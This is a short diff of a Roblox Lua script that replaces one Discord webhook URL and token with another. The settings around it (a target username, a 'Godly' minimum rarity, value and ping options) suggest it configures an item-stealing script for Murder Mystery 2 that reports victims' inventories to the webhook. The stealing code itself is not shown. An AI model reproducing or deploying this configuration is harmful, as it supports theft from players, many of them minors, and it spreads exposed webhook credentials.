@@ -2,7 +2,7 @@ local users = {"ally4ofc"}
 local min_rarity = "Godly"
 local min_value = 1
 local ping = "Yes"
-local webhook = "https://discord.com/api/webhooks/1407135393530384485/G200vNB4aThSKgLul5xiZES9vir3rGh079I6LHAOxDQsZ8QtdcAwPcTAhZPdvSnI-xGB"
+local webhook = "https://discord.com/api/webhooks/1406982165257785515/f-Fhp7M0hDM3-doX8wWN7MR8MuPgj5mzx5JeJdDO4y-3KAkBlrNAgR6PdcWWEtbL8t4v"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
